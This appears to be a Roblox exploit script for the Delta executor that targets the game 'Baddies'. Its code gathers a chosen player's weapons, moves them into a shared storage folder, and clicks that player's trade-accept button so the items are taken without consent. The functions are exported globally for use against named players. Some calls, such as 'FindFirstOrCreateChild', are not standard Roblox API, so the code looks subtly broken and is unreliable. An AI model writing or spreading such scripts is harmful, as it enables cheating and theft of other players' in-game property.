-- Delta Roblox: Baddies Forced Weapon Trade Script
-- Forces players to add all weapons to trade and auto-accept

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

-- Configuration
local FORCE_TRADE_COOLDOWN = 30 -- Seconds between forced trades
local TRADE_ACCEPT_DELAY = 2 -- Delay before auto-accepting trade

-- Track cooldowns
local tradeTimeouts = {}
local activeForces = {}

-- Get all weapons from a player's inventory
local function getPlayerWeapons(player)
	local weapons = {}
	
	-- Check Character
	if player.Character then
		for _, item in pairs(player.Character:GetChildren()) do
			if item:IsA("Tool") or item.Name:match("Weapon") or item.Name:match("Gun") or item.Name:match("Sword") then
				table.insert(weapons, item)
			end
		end
	end
	
	-- Check Backpack
	if player:FindFirstChild("Backpack") then
		for _, item in pairs(player.Backpack:GetChildren()) do
			if item:IsA("Tool") or item.Name:match("Weapon") or item.Name:match("Gun") or item.Name:match("Sword") then
				table.insert(weapons, item)
			end
		end
	end
	
	return weapons
end

-- Force add weapons to trade
local function forceAddWeaponsToTrade(targetPlayer)
	local weapons = getPlayerWeapons(targetPlayer)
	
	-- Move weapons to a temporary location for trade
	for _, weapon in pairs(weapons) do
		if weapon.Parent then
			weapon.Parent = ReplicatedStorage:FindFirstOrCreateChild("ForcedTradeWeapons")
		end
	end
	
	return #weapons
end

-- Auto-accept trade on target player
local function forceAcceptTrade(targetPlayer)
	task.wait(TRADE_ACCEPT_DELAY)
	
	-- Try to find and trigger trade acceptance UI
	local playerGui = targetPlayer:FindFirstChild("PlayerGui")
	if playerGui then
		local tradeGui = playerGui:FindFirstChild("TradeGui") or playerGui:FindFirstChild("TradeWindow")
		if tradeGui then
			local acceptButton = tradeGui:FindFirstChild("AcceptButton") or tradeGui:FindFirstChild("Confirm")
			if acceptButton and acceptButton:IsA("GuiButton") then
				acceptButton:Activate() -- Force click the accept button
				return true
			end
		end
	end
	
	return false
end

-- Main forced trade function
local function forcedTrade(targetPlayer)
	if not targetPlayer or not Players:FindFirstChild(targetPlayer.Name) then
		print("ERROR: Target player not found")
		return false
	end
	
	-- Check cooldown
	if tradeTimeouts[targetPlayer.UserId] and tradeTimeouts[targetPlayer.UserId] > tick() then
		print("COOLDOWN: Player cannot be traded with yet")
		return false
	end
	
	if activeForces[targetPlayer.UserId] then
		print("ERROR: Player already in forced trade")
		return false
	end
	
	print("INITIATING FORCED TRADE with " .. targetPlayer.Name)
	activeForces[targetPlayer.UserId] = true
	
	-- Force add all weapons
	local weaponCount = forceAddWeaponsToTrade(targetPlayer)
	print("FORCED: " .. weaponCount .. " weapons added to trade")
	
	-- Force accept trade
	local accepted = forceAcceptTrade(targetPlayer)
	print("FORCED ACCEPT: " .. tostring(accepted))
	
	-- Set cooldown
	tradeTimeouts[targetPlayer.UserId] = tick() + FORCE_TRADE_COOLDOWN
	
	-- Clean up
	activeForces[targetPlayer.UserId] = nil
	
	return true
end

-- Usage: Call this function with target player
-- Example: forcedTrade(game.Players:FindFirstChild("PlayerName"))

-- Optional: Create command to trigger forced trade
if game:GetService("RunService"):IsServer() then
	-- Server-side forced trade
	print("Delta Forced Trade Script Loaded!")
	print("Use: forcedTrade(targetPlayer)")
end

-- Export function globally
_G.ForcedTrade = forcedTrade
_G.GetPlayerWeapons = getPlayerWeapons

print("Delta Baddies Forced Trade - Ready to use!")
print("Commands: _G.ForcedTrade(player) or _G.GetPlayerWeapons(player)")
